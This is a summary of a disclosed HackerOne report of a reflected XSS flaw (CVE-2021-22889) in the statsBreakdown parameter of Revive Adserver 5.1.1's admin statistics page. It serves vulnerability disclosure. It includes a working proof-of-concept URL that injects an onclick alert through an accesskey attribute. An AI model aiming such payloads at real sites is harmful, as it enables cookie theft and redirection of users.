# Reflected XSS on /admin/stats.php

## Metadata
- **Source:** HackerOne
- **Report:** 1097217 | https://hackerone.com/reports/1097217
- **Submitted:** 2021-02-06
- **Reporter:** solov9ev
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** CVE-2021-22889
- **Category:** web-api

## Summary
Linked to the report [https://hackerone.com/reports/1083376](https://hackerone.com/reports/1083376)
I found a reflected XSS attack on `/admin/stats.php`.

Revive-Adserver version is `revive-adserver-5.1.1`.

### This time I found the parameter `statsBreakdown`

- Go to `http://revive-adserver.loc/admin/stats.php?statsBreakdown=day%27%20onclick=alert(document.domain)%20accesskey=X%20&listorder=key&

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Linked to the report [https://hackerone.com/reports/1083376](https://hackerone.com/reports/1083376)
I found a reflected XSS attack on `/admin/stats.php`.

Revive-Adserver version is `revive-adserver-5.1.1`.

### This time I found the parameter `statsBreakdown`

- Go to `http://revive-adserver.loc/admin/stats.php?statsBreakdown=day%27%20onclick=alert(document.domain)%20accesskey=X%20&listorder=key&orderdirection=up&day=&setPerPage=15&entity=global&breakdown=history&period_preset=last_month&period_start=01+December+2020&period_end=31+December+2020`

- For the payload to be executed, the user needs to press the access key combination for the hidden input field (for Firefox, Alt+Shift+X, see [this](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/accesskey) for other browsers).

{F1186275}

## Impact

With this vulnerability, an attacker can for example steal users cookies or redirect users on malicious website.

</details>

---
*Analysed by Claude on 2026-05-24*
